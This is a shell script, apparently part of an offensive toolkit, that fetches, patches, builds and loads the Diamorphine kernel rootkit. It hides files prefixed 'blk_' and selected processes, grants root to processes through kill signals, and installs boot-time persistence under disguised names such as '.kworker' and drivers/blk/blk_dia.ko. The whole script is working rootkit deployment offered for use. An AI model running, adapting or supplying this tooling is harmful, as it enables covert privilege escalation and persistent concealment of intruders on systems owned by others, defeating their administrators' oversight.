#!/bin/sh
# DESC: Diamorphine LKM: hide blk_* artefacts and selected pids in ring-0
# REQ: root, gcc, make, matching kernel headers
#
# Diamorphine hides every file/directory whose name starts with MAGIC_PREFIX
# and exposes process control through signals (defaults below match upstream):
#   SIGINVIS=63    toggle PF_INVISIBLE for a pid
#   SIGSUPER=64    give root to a pid
#   SIGMODINVIS=31 toggle module visibility
#
# This module is a dependency wrapper, not a vendored rootkit.  Point
# BW_DIA_SRC at a Diamorphine checkout or let it clone one on demand.

P="${BW_PREFIX:-blk_}"
D="${BW_PREFIX_DIR:-/usr/local/sbin/.kworker}"
DRY="${BW_DRY_RUN:-0}"
PREFIX="${BW_HIDE_PREFIX:-blk_}"
ACTION="${BW_DIA_ACTION:-build-load}"
SRC="${BW_DIA_SRC:-/opt/Diamorphine}"
WORK="$D/${P}dia_build"
MARK="$D/${P}dia"
SIGINVIS="${BW_DIA_SIGINVIS:-63}"
SIGSUPER="${BW_DIA_SIGSUPER:-64}"
SIGMODINVIS="${BW_DIA_SIGMODINVIS:-31}"
KVER="$(uname -r 2>/dev/null)"
PREFIX="$(printf '%s' "$PREFIX" | tr -cd 'A-Za-z0-9._-')"
[ -n "$PREFIX" ] || PREFIX="blk_"

say() { printf '[DIAMORPHINE] %s\n' "$1"; }
run() {
    if [ "$DRY" = "1" ]; then
        printf '[dry] %s\n' "$*"
    else
        "$@"
    fi
}

[ "$(id -u 2>/dev/null)" = "0" ] || { say "root is required"; exit 1; }
mkdir -p "$D" 2>/dev/null || true

loaded() {
    [ -f "$MARK" ] && return 0
    grep -qE '(^|[[:space:]])diamorphine([[:space:]]|$)' /proc/modules 2>/dev/null && return 0
    return 1
}

unload_all() {
    say "unloading"
    run rmmod diamorphine 2>/dev/null || run rmmod "${P}dia" 2>/dev/null || true
    run rm -f "$MARK" "/etc/modules-load.d/${P}dia.conf"
    run rm -f "/lib/modules/${KVER}/kernel/drivers/blk/${P}dia.ko" 2>/dev/null || true
    run depmod -a 2>/dev/null || true
    say "unloaded; hidden files are visible again"
}

case "$ACTION" in
    status)
        if loaded; then say "loaded (marker $MARK)"; else say "not loaded"; fi
        say "prefix: $PREFIX // kernel: $KVER"
        say "signals: invis=$SIGINVIS super=$SIGSUPER modinvis=$SIGMODINVIS"
        exit 0
        ;;
    unload)
        unload_all
        exit 0
        ;;
    hide-pid|give-root|toggle)
        loaded || { say "module is not loaded"; exit 1; }
        PIDS="${BW_PID:-${BW_HIDE_PIDS:-}}"
        [ -n "$PIDS" ] || { say "set BW_PID or BW_HIDE_PIDS"; exit 1; }
        for pid in $(printf '%s' "$PIDS" | tr ',' ' '); do
            case "$pid" in ''|*[!0-9]*) continue ;; esac
            case "$ACTION" in
                hide-pid) sig="$SIGINVIS" ;;
                give-root) sig="$SIGSUPER" ;;
                toggle) sig="$SIGMODINVIS" ;;
            esac
            run kill -"$sig" "$pid" 2>/dev/null || true
            say "$ACTION pid $pid (signal $sig)"
        done
        exit 0
        ;;
    build-load|build|load) : ;;
    *)
        say "unknown BW_DIA_ACTION=$ACTION (status|unload|build|load|build-load|hide-pid|give-root|toggle)"
        exit 1
        ;;
esac

if [ "$ACTION" = "build-load" ] || [ "$ACTION" = "build" ]; then
    if [ ! -d "$SRC" ]; then
        if [ "${BW_DIA_CLONE:-0}" = "1" ] && command -v git >/dev/null 2>&1; then
            say "cloning Diamorphine into $SRC"
            run mkdir -p "$(dirname "$SRC")"
            run git clone --depth 1 https://github.com/m0nad/Diamorphine.git "$SRC" || true
        fi
    fi
    [ -d "$SRC" ] || {
        say "source not found: $SRC"
        say "set BW_DIA_SRC=/path/to/Diamorphine or BW_DIA_CLONE=1"
        exit 1
    }
    command -v gcc >/dev/null 2>&1 || { say "gcc missing"; exit 1; }
    command -v make >/dev/null 2>&1 || { say "make missing"; exit 1; }
    [ -d "/lib/modules/${KVER}/build" ] || {
        say "kernel headers missing: /lib/modules/${KVER}/build"
        say "install linux-headers-${KVER} or fall back to the shadow module"
        exit 1
    }

    say "staging source in $WORK (prefix '$PREFIX')"
    rm -rf "$WORK" 2>/dev/null || true
    mkdir -p "$WORK" 2>/dev/null || true
    cp -a "$SRC"/. "$WORK"/ 2>/dev/null || true
    [ -f "$WORK/diamorphine.h" ] || { say "diamorphine.h missing in source"; exit 1; }
    if grep -q '^#define MAGIC_PREFIX' "$WORK/diamorphine.h" 2>/dev/null; then
        if [ "$DRY" = "0" ]; then
            sed -i "s|^#define MAGIC_PREFIX.*|#define MAGIC_PREFIX \"${PREFIX}\"|" "$WORK/diamorphine.h"
        else
            printf '[dry] patch MAGIC_PREFIX -> %s\n' "$PREFIX"
        fi
    else
        [ "$DRY" = "0" ] && printf '\n#define MAGIC_PREFIX "%s"\n' "$PREFIX" >> "$WORK/diamorphine.h"
    fi
    say "building module"
    if [ "$DRY" = "1" ]; then
        printf '[dry] make -C %s\n' "$WORK"
    else
        if ! make -C "$WORK" >"$D/${P}dia_build.log" 2>&1; then
            say "build failed; see $D/${P}dia_build.log"
            tail -n 12 "$D/${P}dia_build.log" 2>/dev/null | sed 's/^/  /'
            exit 1
        fi
    fi
    if [ "$ACTION" = "build" ] || [ "$DRY" = "1" ]; then
        say "build-only run complete"
        exit 0
    fi
fi

KO="${BW_DIA_KO:-$WORK/diamorphine.ko}"
if [ "$ACTION" = "load" ] && [ ! -f "$KO" ]; then
    KO="$(find "$WORK" -name '*.ko' -type f 2>/dev/null | head -n 1)"
fi
[ -f "$KO" ] || { say "kernel object not found: $KO"; exit 1; }

if loaded; then
    say "already loaded"
else
    say "inserting $KO"
    if [ "$DRY" = "1" ]; then
        printf '[dry] insmod %s\n' "$KO"
    elif ! insmod "$KO" 2>"$D/${P}dia_insmod.log"; then
        say "insmod failed; see $D/${P}dia_insmod.log"
        tail -n 8 "$D/${P}dia_insmod.log" 2>/dev/null | sed 's/^/  /'
        say "common causes: Secure Boot, module signature enforcement, kernel/header mismatch"
        exit 1
    fi
fi

run touch "$MARK"
run chmod 600 "$MARK" 2>/dev/null || true

if [ -n "${BW_HIDE_PIDS:-}" ]; then
    for pid in $(printf '%s' "$BW_HIDE_PIDS" | tr ',' ' '); do
        case "$pid" in ''|*[!0-9]*) continue ;; esac
        run kill -"$SIGINVIS" "$pid" 2>/dev/null || true
        say "hid pid $pid"
    done
fi

if [ "$ACTION" = "build-load" ] && [ "$DRY" = "0" ]; then
    say "installing boot-time persistence"
    MODDIR="/lib/modules/${KVER}/kernel/drivers/blk"
    mkdir -p "$MODDIR" 2>/dev/null || true
    cp -f "$KO" "$MODDIR/${P}dia.ko" 2>/dev/null || true
    chmod 644 "$MODDIR/${P}dia.ko" 2>/dev/null || true
    depmod -a 2>/dev/null || true
    mkdir -p /etc/modules-load.d 2>/dev/null || true
    printf '%s\n' "${P}dia" > "/etc/modules-load.d/${P}dia.conf" 2>/dev/null || true
    chmod 644 "/etc/modules-load.d/${P}dia.conf" 2>/dev/null || true
    say "persist: ${P}dia.ko + /etc/modules-load.d/${P}dia.conf"
fi

say "done; files starting with '$PREFIX' and selected pids are hidden"
say "control: kill -$SIGINVIS <pid> hide // kill -$SIGSUPER <pid> root // kill -$SIGMODINVIS <pid> module"
